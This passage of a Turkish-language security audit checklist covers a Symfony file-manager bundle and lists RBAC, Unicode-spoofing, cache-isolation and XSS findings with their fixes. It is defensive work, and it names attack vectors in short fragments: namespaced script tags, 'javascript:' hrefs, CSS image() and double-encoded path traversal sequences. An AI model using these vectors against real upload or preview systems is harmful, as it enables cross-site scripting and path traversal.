- [x] **P9-03 [YÜKSEK GÜVENLİK — RBAC EKSİKLİKLERİ] `ApiController` / `ImageEditorController` / `RemoteUrlImporter` / `UploadManager` / `TrashManager` Eksik `VIEW` Kapıları ve Varlık Kahinleri**
  - **Dosyalar:** `src/Controller/ApiController.php`, `src/Controller/ImageEditorController.php`, `src/Service/RemoteUrlImporter.php`, `src/Service/UploadManager.php`, `src/Service/TrashManager.php`
  - **Bulgu:**
    1. `ApiController::trash()`, `handleEmptyTrash()`, `handleRestoreTrash()`, `handlePurgeTrash()`, `handleClearCache()` ve `RemoteUrlImporter`/`UploadManager` üzerinde temel `FILE_MANAGER_VIEW` doğrulaması eksikti; özellikle `restoreTrash`/`purgeTrash` eksik dosya/id için `VIEW` olmadan `trash_entry_not_found` varlık kahini verebiliyordu.
    2. `ImageEditorController::__invoke()` yetki kontrolünden önce `$filesystem->fileExists($cleanPath)` çalıştırarak varlık kahini oluşturmaktaydı.
    3. `TrashManager::deletePermanently()` `$enforceVoter = true` iken `>5000` öğe sınırında fırlatılan `FileManagerException` ve `InvalidPathException` istisnalarını `catch (\Throwable)` bloğunda yutuyordu.
  - **Yapılan Değişiklik:** Tüm bu uçlara `FILE_MANAGER_VIEW` zorunluluğu ve doğru doğrulama sırası getirildi; `TrashManager` içine `FileManagerException|InvalidPathException` re-throw eklendi ve `$cleanTargetDir` `VIEW` denetimi `FileOperationsService::moveOrCopy()` içine alındı.

- [x] **P9-04 [YÜKSEK GÜVENLİK & ATOMİKLİK] Toplu Taşıma/Kopyalama ve Toplu Silme Atomik Ön-Doğrulaması (`preValidateBulkMoveItems` & `preValidateDeleteItems`)**
  - **Dosyalar:** `src/Service/FileOperationsService.php`, `src/Controller/ApiController.php`
  - **Bulgu:** `handleBulkMove` ve `handleDelete` ilk öğeleri değiştirip yalnızca sonraki bir öğede (veya derin klasör alt öğesinde, aynı partide farklı kaynak klasörlerinden gelen aynı isimli dosyalarda, ya da toplam transfer kotasında) hata aldığında kısmi veri kaybı/taşınması bırakabiliyordu; ayrıca Windows yerel dosya sisteminde `pruneNestedPaths()` büyük-küçük harf duyarsız çalışmıyordu.
  - **Yapılan Değişiklik:** `FileOperationsService` içine `resolveTransferContext()`, `validateTransferCandidate()`, `validateDeleteCandidate()`, `preValidateBulkMoveItems()` (toplu çakışma, derin klasör alt-öğe ve toplam transfer kotası denetimi) ve `preValidateDeleteItems()` eklendi; `pruneNestedPaths()` Windows yerel volume'lerde `mb_strtolower(..., 'UTF-8')` duyarlı hale getirildi.

- [x] **P9-05 [ORTA GÜVENLİK — ÇOKLU KİRACI İZOLASYONU] Aynı `base_path` Altındaki Yerel Alt-Volume Önbellek Çakışması ve `DynamicPathResolver` Kimlik Çarpışması**
  - **Dosyalar:** `src/Service/DirectoryCacheManager.php`, `src/EventListener/CacheInvalidationListener.php`, `src/Config/DynamicPathResolver.php`
  - **Bulgu:** Aynı `base_path` altındaki iki kiracı yerel sub-volume (`tenants/a`, `tenants/b`) aynı `local` cache scope'unu paylaşabilmekteydi; `DynamicPathResolver::sanitizeIdentifier()` `CON`/`PRN` gibi Windows ayrılmış adlarını ve `Tenant_A` vs `tenant_a` gibi büyük-küçük harf farklarını dosya sisteminde çakıştırabiliyordu.
  - **Yapılan Değişiklik:** `DirectoryCacheManager::resolveVolumeScopeForRoot()` (`local_sub::...`) ve `invalidateVolumeScope()` eklendi (`SeventhPass` `extractVolumeScope('local::...') === 'local'` davranışı korunarak); `DynamicPathResolver` Windows ayrılmış adlarını ve `[A-Z]` içeren kimlikleri deterministik `id_...` karmasına çevirdi.

- [x] **P9-06 [ORTA GÜVENLİK & YARIŞ DURUMU] `UploadManager` Chunk Montaj Kilidi ve `ZipArchiveService` `CREATE_FOLDER` / `$destBase` Dosya Çakışması**
  - **Dosyalar:** `src/Service/UploadManager.php`, `src/Service/ZipArchiveService.php`
  - **Bulgu:** `handleChunk()` `.assemble.lock` kilidini `finalizeFile()` öncesinde serbest bırakabilmekteydi ve tek-parça yüklemelerde gereksiz yere iki kez `normalizeForUpload()` çağırmaktaydı; `ZipArchiveService::extractArchive()` `$destBase` hedefinde aynı isimde dosya varken klasör açmaya çalışmakta ve alt klasör oluşturan ZIP'lerde `CREATE_FOLDER` iznini tutarlı doğrulamamaktaydı.
  - **Yapılan Değişiklik:** Chunk kilidi `finalizeFile()` sonuna kadar tutuldu; `ZipArchiveService` içine düz ZIP uyumluluğunu bozmadan alt-klasör oluştururken `CREATE_FOLDER` ve `$destBase` dosya çarpışma kontrolü (`errors.target_exists`) eklendi.

- [x] **P9-07 [YÜKSEK GÜVENLİK — FRONTEND PICKER] `picker_controller.js::isSafeRelativePath()` ve `extractFilename()` Sertleştirmesi**
  - **Dosya:** `assets/controllers/picker_controller.js`
  - **Bulgu:** `isSafeRelativePath()` U+FF0F/U+2215/U+2044/U+FF3C slash eşleniklerini, unencoded `?`/`#`, kodlanmış (`%0x`, `%1x`, `%7f`, `%2f`, `%5c`, `%2e` ve `%25...` çift kodlu) sekansları, Windows sürücü harflerini (`C:`) ve Windows cihaz adlarını reddetmiyordu; `extractFilename('a.svg?x=1')` `?x=1` sonekini kesmiyordu.
  - **Yapılan Değişiklik:** Tüm bu kontroller PHP `FileManagerPickerType::isSafePickerValue()` kurallarıyla birebir hizalandı (`50%off.png` geçerli dosya adı korunarak) ve `extractFilename()` `!isUrlValue` yolunda `[?#].*$` sonekini kesti.

### 7.2. Global Unicode, Depolama ve Performans Bulguları (`P9-08` – `P9-15`)

- [x] **P9-08 [GLOBAL UNICODE] `FolderMetadata`, `UnicodeHelper` (`U+2024` & BOM-Only), `PathNormalizer` ve `core.css` BiDi**
  - **Dosyalar:** `src/Metadata/FolderMetadata.php`, `src/Util/UnicodeHelper.php`, `src/Security/PathNormalizer.php`, `assets/styles/core.css`
  - **Bulgu:** `FolderMetadata` `sanitizeText()`/`sanitizeTags()` kontrol/BiDi/ZWSP temizliğini `trimSpaces()` öncesinde yapmadığında kenar boşlukları kalabilmekteydi; `\u{2024}` (ONE DOT LEADER) dot-folding dışında kalmıştı; yalnızca BOM baytlarından oluşan UTF-16/UTF-32 dosyaları `convertBomEncodedBytes()` tarafından `''` yerine `null` (binary sanılma) döndürmekteydi; `PathNormalizer` fiziksel `..` içeren `base_path` ve Windows drive büyük-küçük harf farklarında tutarsızlık gösterebiliyordu.
  - **Yapılan Değişiklik:** `FolderMetadata` kontrol/`\p{Zl}`/`\p{Zp}`/BiDi/`ZWSP`/`WJ` temizliği `trimSpaces()` öncesine taşındı (kenar ZWNJ/ZWJ temizlenip Farsça kelime içi ZWNJ korundu); `UnicodeHelper` `\u{2024}` ve BOM-only dönüşünü düzeltti; `PathNormalizer` fiziksel canonicalization & case-insensitive prefix karşılaştırmasını (mevcut `@ext_<md5>` karmalarını koruyarak) düzeltti; `core.css` `.liveux-fm-truncate` içine `unicode-bidi: plaintext` ve `.liveux-fm-picker` dark Tailwind/Shadcn kuralları eklendi.

- [x] **P9-09 [DEPOLAMA & EVENT TUTARLILIĞI] `MetadataSyncListener` S3 Sanal Alt-Klasör Koruması ve `JsonFileMetadataStorage` Boş Kayıt Optimizasyonu**
  - **Dosyalar:** `src/EventListener/MetadataSyncListener.php`, `src/Metadata/JsonFileMetadataStorage.php`
  - **Bulgu:** Nesne depolamada (S3/R2) klasör kopyalandığında yalnızca sanal alt klasör (`target/sub/file.txt`) olarak bulunan ara dizinlerin kopyalanmış metadata'sı `pruneOrphanCopiedMetadata()` tarafından silinmekteydi; boş metadata kaydedilirken mevcut olmayan anahtar için bile JSON dosyası `flock` ile yeniden yazılıyordu.
  - **Yapılan Değişiklik:** `MetadataSyncListener` tüm üst sanal dizinleri `PathNormalizer::dirnameUtf8()` döngüsüyle canlı işaretledi; `JsonFileMetadataStorage::save()` anahtar yokken boş metadata geldiğinde `null` dönerek gereksiz I/O'yu sıfırladı.

- [x] **P9-10 [SQL PERFORMANS & NFC] `DoctrineDbalMetadataStorage` `itemCache` Sınırı ve NFD→NFC Kanonikleştirme**
  - **Dosya:** `src/Bridge/Doctrine/DoctrineDbalMetadataStorage.php`
  - **Bulgu:** Uzun süren CLI batch'lerinde `save()` bellek içi `$itemCache` boyutunu sınırlamıyordu (`MAX_ITEM_CACHE_ENTRIES` yalnızca okuma tarafındaydı); `delete()`, `relocatePrefix()` ve `copyPrefix()` satır `canonical_key` eşleştirmelerinde NFC normalizasyonu uygulanmıyordu.
  - **Yapılan Değişiklik:** Kapasite `16384`'e yükseltilip `save()` içinde de uygulandı; mutasyonlarda `UnicodeHelper::toNfc()` zorunlu kılındı.

- [x] **P9-11 [ALGORİTMA PERFORMANSI — `O(N + Z)`] `ZipArchiveService`, `DuplicateDetector` ve `StorageQuotaChecker` Toplu İşlem Optimizasyonu**
  - **Dosyalar:** `src/Service/ZipArchiveService.php`, `src/Service/DuplicateDetector.php`, `src/Service/StorageQuotaChecker.php`
  - **Bulgu:** `extractArchive()` içinde her ZIP öğesi için volume boyutu yeniden taranarak `O(Z × N)` karmaşıklığı oluşmaktaydı; duplicate SHA-256 index'leri önbelleğe alınmıyordu ve yerel sub-volume/S3 scope'ları `StorageQuotaChecker`/`DuplicateDetector` içine geçirilemiyordu.
  - **Yapılan Değişiklik:** `DuplicateDetector::snapshotSizeIndex()` ve `findDuplicateInSizeIndex()` ile `O(N + Z)` tek tarama sağlandı; `__sha256_hashes__` cache + volume scope izolasyonu eklendi.

- [x] **P9-12 [ARAMA, OPTİMİZASYON & THUMBNAIL PERFORMANSI] `DirectoryLister`, `ImageOptimizer`, `ThumbnailController`, `StorageStatsCommand` ve `IconSetRegistry`**
  - **Dosyalar:** `src/Service/DirectoryLister.php`, `src/Service/ImageOptimizer.php`, `src/Controller/ThumbnailController.php`, `src/Service/ProfileFileScanner.php`, `src/Command/StorageStatsCommand.php`, `src/Icon/IconSetRegistry.php`
  - **Yapılan Değişiklik:** `DirectoryLister::searchRecursive()` 250'şer batch `preload()` kullandı; `ImageOptimizer::isAnimatedWebp()` animasyonlu WebP kare kaybını önledi; `ThumbnailController` taze önbellek hit'lerinde uzak stat çağrısını (`skipRemoteStat`) atladı; `StorageStatsCommand` tek taramada görsel sayımını birleştirdi; `IconSetRegistry` boş/güvensiz özel SVG'de fallback ve `<svg class aria-hidden>` öznitelik birleştirme uyguladı.

- [x] **P9-13 [FRONTEND RTL & MARQUEE PERFORMANSI] `browser_controller.js::onContentMouseDown()`**
  - **Dosya:** `assets/controllers/browser_controller.js`
  - **Bulgu:** RTL arayüzünde marquee seçimi sol taraftaki kaydırma çubuğundan başlatılabilmekte ve negatif `scrollLeft` ile kaymaktaydı; `querySelectorAll`/`getBoundingClientRect` 6px eşiği aşılmadan tetikleniyordu ve kartlarda `data-volume` eksikti.
  - **Yapılan Değişiklik:** Sol kaydırma çubuğu sınır koruması, RTL yatay scroll koordinatı, ertelenmiş DOM sorgusu, 0-seçimde `lastSelectedPath = null` sıfırlaması ve `data-volume` + `volume` özellikleri eklendi.

- [x] **P9-14 [FRONTEND IME, ARAMA, LIGHTBOX & INSPECTOR] `browser_controller.js` Performans ve Bellek İyileştirmeleri**
  - **Dosya:** `assets/controllers/browser_controller.js`
  - **Bulgu:** `onSearchInput()` içinde IME kompozisyon koruması eksikti; arka arkaya tuş vuruşlarında senkron reflow olmaktaydı; `treeCache` aramalarında `foldSearch()` her öğede tekrarlanıyordu; Lightbox hızlı dosya geçişlerinde eski metin `fetch()` istekleri iptal edilmiyordu; `renderInspector()` boyut önbelleği dosya boyutunu (`activeItem.size`) dikkate almıyordu ve sayıları/koordinatları yerelleştirmiyordu.
  - **Yapılan Değişiklik:** `event?.isComposing` erken çıkışı, `scheduleCoalescedRender()` (`requestAnimationFrame` birleştirme), `normalizeTreeFolders()` ön-katlaması, `cancelLightboxTextFetch()` `AbortController`, `cancelInspectorImageProbe()`, `isStillShowing` volume/hidden denetimi, `dir="ltr"` + `formatNumber()`, `size` anahtarlı `dimKey`, RTL `Alt+ArrowLeft/Right`, `decoding="async"` thumb ve ölü kod temizliği eklendi.

- [x] **P9-15 [OTOMATİK DOĞRULAMA KAPSAMI] `tests/Unit/Security/NinthPassGlobalSecurityAuditTest.php` ve `tests/Js/frontend_audit_test.mjs` (Test 13)**
  - **Dosyalar:** `tests/Unit/Security/NinthPassGlobalSecurityAuditTest.php`, `tests/Js/frontend_audit_test.mjs`
  - **Yapılan Değişiklik:** Backend (`PHPUnit 269/269`, `2.757` assertion, `PHPStan Level 8` `0 hata`, `PHP lint 150/150`) ve Frontend (`node --test 27/27`, `Node lint 7/7`, `Twig 33/33`, `YAML 3/3`) tarafında tüm 9. tur bulguları regresyon testlerine bağlandı.

---

## 8. 10. Tur (Pass-10) — Rapor, Dokümantasyon ve Skill Tutarlılık Denetimi (`T10-01` – `T10-14`)

> **Denetim Tarihi:** `24.11.2026` | **Denetçi Model:** Google Antigravity — Gemini 4 (Extra High Reasoning)  
> **Kapsam:** Önceki turlarda raporlanan tüm düzeltmelerin (1–9. tur) gerçek PHP, JS, CSS, Twig, YAML ve Skill kaynak kodlarıyla birebir çapraz doğrulaması.

- [x] **T10-01 [TUTARSIZLIK — GÜVENLİK] `SvgSanitizer` CSS Çift-Kaçış / Karakter Sınıfı ve `<style>` Alt Düğüm Sertleştirmesi**
  - **Dosya:** `src/Security/SvgSanitizer.php`
  - **Tespit:** `hasDangerousCss()` içindeki `stripCssComments()` escape sırası, unrolled string regex'inde `null` (PCRE limit) dönüşünün fail-closed işlenmemesi ve `<style>` içindeki `DOMElement` / `DOMCdataSection` düğümlerinin tekil kontrolü yetersizdi.
  - **Düzeltme:** `sanitizeStyleElement()` non-`DOMText` düğümleri temizleyip `<style>` içinde çocuk element varsa düğümü düşürecek şekilde sertleştirildi; CSS `image(` engellendi; `preg_replace()` `null` sonucu fail-closed (`true`) döndü.

- [x] **T10-02 [TUTARSIZLIK — İZOLASYON] `DynamicPathResolver::sanitizeIdentifier()` Küçük Harf İdempotency Farkı**
  - **Dosya:** `src/Config/DynamicPathResolver.php`
  - **Tespit:** `sanitizeIdentifier()` karmalı çıktıda büyük harfli slug karakterlerini koruyabildiği için `/^[a-z0-9_-]{1,128}$/` kontrolü ikinci çağrıda tekrar karmaya düşebiliyordu.
  - **Düzeltme:** `$slug = strtolower(...)` uygulanarak tüm kimliklerin tek geçişte idempotent olması sağlandı.

- [x] **T10-03 [TUTARSIZLIK — CACHE/PERFORMANS] `ImageOptimizer`, `DuplicateDetector` & `UploadManager` PHP `stat` Önbellek Tutarsızlığı ve `DirectoryLister` Voter Klasör Sayımı**
  - **Dosyalar:** `src/Service/ImageOptimizer.php`, `src/Service/DuplicateDetector.php`, `src/Service/UploadManager.php`, `src/Service/ZipArchiveService.php`, `src/Service/DirectoryLister.php`
  - **Tespit:** Aynı geçici dosya yeniden yazıldıktan sonra `filesize()` eski değer döndürebiliyordu; `DirectoryLister::shouldResolveFolderCounts()` Voter aktifken klasör başına 2.000 düğümlük ağacı gereksiz tarayabiliyordu ve özel `maxDepth` çağrıları `TREE_CACHE_KEY`'i paylaşabiliyordu.
  - **Düzeltme:** Tüm yazım/boyut noktalarına `clearstatcache(true, ...)` eklendi; `shouldResolveFolderCounts()` `$authChecker !== null && $profile->isVoterEnabled()` iken maliyetli alt-sayımı kapattı; varsayılan `6` dışı derinliklere `_d{$maxDepth}` soneki eklendi.

- [x] **T10-04 [TUTARSIZLIK — CACHE İZOLASYONU] S3 Alt-Hacim (`s3::bucket/prefix`) Önbellek Kapsam İzolasyonu ve `CacheClearCommand` Hizalaması**
  - **Dosyalar:** `src/Service/DirectoryCacheManager.php`, `src/EventListener/CacheInvalidationListener.php`, `src/Command/CacheClearCommand.php`
  - **Tespit:** Aynı S3 kovasında farklı `prefix` kullanan hacimler aynı `s3` önbellek kapsamını paylaşabiliyordu; `CacheClearCommand` ve `CacheInvalidationListener` alt-klasör veya yanlış scope siliyordu.
  - **Düzeltme:** `resolveVolumeScopeForRoot()` içine `s3_sub::` izolasyonu eklendi; `CacheClearCommand` ve `CacheInvalidationListener` `invalidateVolumeScope(resolveVolumeScopeForRoot(...))` üzerinden hizalandı (`invalidateAncestors()` derinliği `32`'ye çıkarıldı).

- [x] **T10-05 [TUTARSIZLIK — ATOMİKLİK] Toplu Kopyalama (`$strictMove = false`) ve Toplu Silme Çöp Kutusu Kota Ön-Doğrulaması**
  - **Dosyalar:** `src/Service/FileOperationsService.php`, `src/Service/TrashManager.php`
  - **Tespit:** Toplu kopyalamada hariç tutulan/erişim dışı alt öğeler kopyalanmış gibi durabiliyordu ve toplu çöp kutusu taşımada birikimli `trash.max_size` tek tek kontrol nedeniyle kısmi silmeye yol açabiliyordu.
  - **Düzeltme:** `validateDirectoryContentsForMove()` içine `$strictMove` (`!$isCopy`) parametresi, `TrashManager` içine `assertBatchCanMoveToTrash()` ve `preValidateDeleteItems()` entegrasyonu eklendi.

- [x] **T10-06 [TUTARSIZLIK — FORM PICKER] `FileManagerPickerType` Yol/URL Karma Bypass ve `color_scheme` Eksikliği**
  - **Dosyalar:** `src/Form/FileManagerPickerType.php`, `templates/form/picker.html.twig`
  - **Tespit:** `'path'` modu Unicode slash/çift-kodlu traversal vektörlerini kaçırabiliyordu; `'url'` modu `path[]` dizilerini ve `rawurldecode` sırasını atlayabiliyordu; form şablonu `data-fm-color-scheme` yaymıyordu.
  - **Düzeltme:** `isSafeUrlPathCandidate()`, `isSafeUrlQueryCandidate()` ve `areUrlPathSegmentsSafe()` yardımcıları ayrıştırıldı; `color_scheme` seçeneği (`null|'auto'|'light'|'dark'`) ve `data-fm-color-scheme` çıktısı eklendi.

- [x] **T10-07 [TUTARSIZLIK — KONFİGÜRASYON] `Configuration` Çoklu Dosya Birleştirmede `extract_zip` Kuralı**
  - **Dosyalar:** `src/DependencyInjection/Configuration.php`, `src/Config/YamlConfigProvider.php`
  - **Tespit:** Profil bazında açık `extract_zip: 'ROLE_ADMIN'` tanımı farklı yapılandırma dosyalarından gelen `allow_extract: false` ile ezilebiliyor veya tutarsız kalabiliyordu.
  - **Düzeltme:** `extract_zip` `->defaultNull()` + birleştirme sonrası `validate()->always(...)` kuralıyla `null` değerler `!allow_extract` iken `false`a sabitlendi, açık rol/boolean değerler korundu.

- [x] **T10-08 [TUTARSIZLIK — TWIG GÜVENLİK] `FileManagerTwigExtension` Harici `/download` / `?path=` Spoofing & `.svgz`/`html` Önlemi**
  - **Dosya:** `src/Twig/Extension/FileManagerTwigExtension.php`
  - **Tespit:** Harici URL'lerin sonunun `/download` ile bitmesi durumunda `imgSrc` yanlışlıkla `/thumb` olarak yeniden yazılabiliyordu; doğrudan `.svg` `<img src>` çalışırken `.svgz`/`html`/`xhtml`/`xml` aktif belgeleri de tam kısıtlanmalıydı.
  - **Düzeltme:** Yalnızca kök-göreceli (`/download`, `/share`) uçlarda `?path=` incelendi; `isActiveDocumentExtension()` tüm aktif doküman uzantılarını engelledi ve doğrudan `.svg` için `href: null` korunarak `imgSrc` izinli bırakıldı.

- [x] **T10-09 [TUTARSIZLIK — EVENT & THUMBNAIL] `FolderDeletedEvent` Çoklu Profil Thumbnail Temizliği ve `ThumbnailController` TTL**
  - **Dosyalar:** `src/Event/FolderDeletedEvent.php`, `src/Service/FileOperationsService.php`, `src/EventListener/ThumbnailCleanupListener.php`, `src/Controller/ThumbnailController.php`
  - **Tespit:** Klasör silindiğinde yalnızca ana profil veya eksik alt dosya thumbnail'ları temizlenebiliyordu; `ThumbnailController` `volume.cacheTtl === null` iken `profile.cache.ttl`'i devralmıyordu.
  - **Düzeltme:** `FolderDeletedEvent::$deletedChildCanonicalPaths` tüm profillerde temizlendi; uzak/S3 hacimlerde `directoryExists()` gereksiz engeli kaldırıldı; `ThumbnailController` `$volume->cacheTtl ?? profile.cache.ttl` kullandı.

- [x] **T10-10 [TUTARSIZLIK — UZAK URL İMPORT] `RemoteUrlImporter` Windows Ayrılmış Yedek Ad ve Header Sınırı**
  - **Dosya:** `src/Service/RemoteUrlImporter.php`
  - **Tespit:** URL'den düşen yedek ad (`AUX.jpg` gibi) Windows cihaz adı çakışmasına uğrayabiliyordu ve cURL header callback sınırı yoktu.
  - **Düzeltme:** Güvenlik doğrulamasından geçemeyen adaylar `imported-` önekiyle güvenceye alındı; `foldDotEquivalents()` ile sondaki nokta kontrolleri hizalandı; header sayısı (`200`) ve boyutu (`64 KB`) sınırlandırıldı.

- [x] **T10-11 [TUTARSIZLIK — CLI] `ThumbnailClearCommand` Ters Sıralı İç İçe Dizinler ve `--path` Doğrulaması**
  - **Dosya:** `src/Command/ThumbnailClearCommand.php`
  - **Tespit:** Alt cache dizini üst dizinden önce geldiğinde çifte silme girişimi olabiliyor ve `InvalidPathException` yutulabiliyordu.
  - **Düzeltme:** Dizinler en kısa yoldan başlayarak tekilleştirildi ve `InvalidPathException` doğrudan yeniden fırlatıldı.

- [x] **T10-12 [TUTARSIZLIK — DOKÜMAN PARİTESİ] `docs/tr/09-symfony-ai-entegrasyonu.md` & Çeviri Paritesi**
  - **Dosyalar:** `docs/tr/09-symfony-ai-entegrasyonu.md`, `translations/LiveUXFileManagerBundle.{en,tr,fr}.yaml`
  - **Tespit:** `text/yaml` desteği dokümanda eksik görünmekteydi ve kaldırılmış `Düzenle ▸` alt menü ifadesi kalmıştı; `overwrite` kullanım engeli anahtarı tüm dillerde eksikti.
  - **Düzeltme:** `09-symfony-ai-entegrasyonu.md` güncellendi; `errors.overwrite_blocked_in_use` anahtarı `en`/`tr`/`fr` kataloglarına (`488` anahtar, tam parite) eklendi.

- [x] **T10-13 [TUTARSIZLIK — YETKİ] `AssetUsageGuardService` `overwrite` İşlemi & `ZipDownloadController` `403` Yanıtı**
  - **Dosyalar:** `src/Service/AssetUsageGuardService.php`, `src/Controller/ZipDownloadController.php`
  - **Tespit:** `ImageEditor` üzerine yazmada `overwrite` işlemi varsayılan silme mesajına düşebiliyordu; `ZipDownloadController` `AccessDeniedException`'ı `422` ile döndürebiliyordu.
  - **Düzeltme:** `'overwrite'` dalı ve `AccessDeniedException -> 403` yakalayıcısı eklendi.

- [x] **T10-14 [TUTARSIZLIK — SKILL, DOKÜMANTASYON & PAKETLEME] `DialogHost` Söz dizimi, Özel Şablon Sarmalayıcısı, Tema Yolu, `AuditLogListener` Kapsamı, `CHANGELOG.md` ve `assets/package.json`**
  - **Dosyalar:** `docs/en/01-installation.md`, `docs/fr/01-installation.md`, `docs/tr/02-yapilandirma-ve-profiller.md`, `docs/tr/06-guvenlik-ve-yetkilendirme.md`, `docs/tr/README.md`, `skills/liveux-file-manager-setup/SKILL.md`, `skills/liveux-file-manager-setup/references/config-schema.md`, `skills/liveux-file-manager-forms-and-editors/SKILL.md`, `skills/liveux-file-manager-forms-and-editors/references/picker-and-js-api.md`, `skills/liveux-file-manager-theming-and-icons/SKILL.md`, `CHANGELOG.md`, `assets/package.json`, `assets/styles/core.css`
  - **Düzeltme:** Tüm `<twig:LiveUX:FileManager:DialogHost />` örnekleri `@LiveUXFileManager/components/DialogHost.html.twig` ile değiştirildi; custom `template` örneğindeki yinelenen Stimulus wrapper kaldırıldı; tema override yolu için 11. turda (`T11-06`) `FileManagerBundle::prependTwig()` (`twig.paths`) uyumu netleştirildi; `AuditLogListener` kapsamı 9 alan olayı (paylaşım linki üretimi hariç) şeklinde netleştirildi; `CHANGELOG.md` güncellendi; `core.css` yinelenen dark picker bloğu temizlendi; `assets/package.json` içine `"type": "module"` ve doğru test komutu eklendi.

---

## 9. 10. Tur (Pass-10) — Yeni Güvenlik, Eşzamanlılık, Performans ve Global Unicode Bulguları (`P10-01` – `P10-13`)

> **Denetim Tarihi:** `24.11.2026` | **Denetçi Model:** Google Antigravity — Gemini 4 (Extra High Reasoning)  
> **Doğrulama:** `tests/Unit/Security/TenthPassGlobalSecurityAuditTest.php` ve `tests/Js/frontend_audit_test.mjs` (Test 14)

- [x] **P10-01 [YÜKSEK GLOBAL UNICODE — JS/EDITÖR] ZWNJ (`U+200C`) / ZWJ (`U+200D`) İzinli İç Kullanım vs. Kenar/Uzantı/Nokta Spoofing Koruması**
  - **Dosyalar:** `assets/controllers/picker_controller.js`, `assets/controllers/dialog_controller.js`, `assets/controllers/browser_controller.js`, `assets/js/integrations/{ckeditor5,tinymce,tiptap}_adapter.js`
  - **Bulgu:** `[\u200B-\u200F]` aralığı Farsça/İndik ZWNJ (`U+200C`) ve çok-kodlu Emoji ZWJ (`U+200D`) içeren meşru dosya adlarını (`گالری/می‌روم.jpg`, `👨‍👩‍👧.png`) JS tarafında haksız yere reddediyordu; buna karşın kenar/uzantı içi ZWNJ/ZWJ veya `U+2024` nokta gizlemesi `isSafeRelativePath()` içinde ayrıştırılmıyordu.
  - **Yapılan Değişiklik:** Tüm 6 JS dosyasında (8 nokta) `[\u200B\u200E\u200F]` hedeflendi; `picker_controller.js::isSafeRelativePath()` segment başında/sonunda ve uzantı içinde ZWNJ/ZWJ'yi ve `U+2024` noktasını engelledi.

- [x] **P10-02 [KRİTİK XSS — SVG & DIALOG] XML Namespace Önekli (`<html:script>`, `svg:href="javascript:"`), CSS `image()` ve CDATA/Element `<style>` Vektörleri**
  - **Dosyalar:** `src/Security/SvgSanitizer.php`, `assets/controllers/dialog_controller.js`
  - **Bulgu:** `DialogController::sanitizeHtmlFragment()` `href`/`xlink:href` dışında özel XML önekli `svg:href` (`localName === 'href'`) niteliklerini atlayabiliyordu; `SvgSanitizer` `<style>` alt elementlerini ve CSS `image(...)` fonksiyonunu reddetmiyordu.
  - **Yapılan Değişiklik:** `dialog_controller.js` `localName === 'href' || localName === 'src'` kontrolünü ekledi; `SvgSanitizer` namespace beyaz listesini, `sanitizeStyleElement()` alt-element reddini ve CSS `image(` engelini zorunlu kıldı.

- [x] **P10-03 [ORTA GÜVENLİK — MIME WILDCARD] Backend ve İstemci MIME Eşleştirmesinde `type/*`, `*/*` ve `;charset` Parametre Tutarsızlığı**
  - **Dosyalar:** `src/Security/FileSecurityGuard.php`, `src/Service/UploadManager.php`, `src/Service/ZipArchiveService.php`, `src/Service/FileOperationsService.php`, `src/Controller/ImageEditorController.php`, `src/Command/OptimizeImagesCommand.php`, `src/DependencyInjection/Configuration.php`, `src/Config/YamlConfigProvider.php`, `assets/controllers/browser_controller.js`
  - **Bulgu:** Bazı noktalarda `in_array()` yalnızca tam eşleşme aradığı için `image/*` gibi kalıplar veya `image/png; charset=utf-8` parametreleri uyumsuz çalışıyordu; `BLOCKED_ACTIVE_MIMES` eksik aktif türler içeriyordu.
  - **Yapılan Değişiklik:** Merkezi `FileSecurityGuard::matchesMimeList()` ve istemci tarafı `matchesMimePatternList()` eklendi; `BLOCKED_ACTIVE_MIMES` 17 yeni aktif MIME ile genişletildi; `text/*` + sıkı ikili uzantı uyuşmazlığı sertleştirildi.

- [x] **P10-04 [YÜKSEK GLOBAL UNICODE — PHP] CGJ (`U+034F`), Moğol FVS (`U+180B..U+180F`), `U+206A..U+206F`, Almanca `ß`/`ẞ`, Tam Genişlikli ASCII, Türkçe `İ` Etiketler ve Unicode Slash Lookalikes**
  - **Dosyalar:** `src/Util/UnicodeHelper.php`, `src/Security/PathNormalizer.php`, `src/Metadata/FolderMetadata.php`
  - **Bulgu:** Görünmez birleştirici/biçim karakterleri (`U+034F`, `U+180B..U+180F`, `U+206A..U+206F`) `visibleSkeleton()` kaçışı yapabiliyordu; Tam genişlikli ASCII (`ＰＤＦ`) ve Almanca `ß`/`ẞ` arama katlamasında eksikti; Unicode slash eşlenikleri (`\u{FF0F}`, `\u{2215}`, `\u{2044}`, `\u{FF3C}`) veya `İ` etiket tekilleştirmesi atlanabiliyordu.
  - **Yapılan Değişiklik:** Tüm Unicode karakter sınıfları `UnicodeHelper`, `PathNormalizer::assertSafeSegment()` ve `FolderMetadata::sanitizeTags()` içine işlendi.

- [x] **P10-05 [YÜKSEK GÜVENLİK — RBAC & KAHİN] `ApiController` `restoreTrash`/`purgeTrash` Kök Yetki Önceliği, `abortUpload` `VIEW`, Boş `checkUsage`, Dizi Parametre `400` ve `BrowserComponent` / `AutoInjectDialogHostSubscriber` Kapıları**
  - **Dosyalar:** `src/Controller/ApiController.php`, `src/Twig/Components/BrowserComponent.php`, `src/EventListener/AutoInjectDialogHostSubscriber.php`
  - **Bulgu:** Yetkisiz kullanıcı `restoreTrash`/`purgeTrash` üzerinden çöp kimliği varlık kahini alabiliyordu; `abortUpload` `VIEW` kontrolü ve boş `checkUsage` kök `VIEW`+`DELETE` kontrolü eksikti; dizi query parametreleri (`?volume[]=`) 500 üretebiliyordu; `BrowserComponent` yetkisiz hacimleri veya kotayı erken sızdırabiliyordu.
  - **Yapılan Değişiklik:** `ApiController` tüm uçlarda yetki sırasını ve skaler query doğrulamasını sertleştirdi; `BrowserComponent` hacimleri `VIEW` ile filtreleyip kapasite/kota özetini memoize etti.

- [x] **P10-06 [YÜKSEK GÜVENLİK — İNDİRME & ÖNİZLEME] `DownloadController` / `ShareController` / `ThumbnailController` `.svgz` & Bozuk MIME ve `{user_id}` / `Authorization` Özel Bağlamı**
  - **Dosyalar:** `src/Controller/DownloadController.php`, `src/Controller/ShareController.php`, `src/Controller/ThumbnailController.php`
  - **Bulgu:** Geçersiz/enjeksiyonlu `Content-Type` MIME dizeleri doğrulanmıyordu; `{user_id}` dinamik yolu veya `Authorization` başlığı taşıyan istekler genel tarayıcı önbelleğine sızabiliyordu.
  - **Yapılan Değişiklik:** Sıkı MIME sözdizimi doğrulaması + `.svg`/`.svgz`/`script`/`xml`/`html` için zorunlu `attachment` + sandbox CSP eklendi; `{user_id}` hacimleri ve `Authorization` istekleri zorunlu `private` bağlamına alındı.

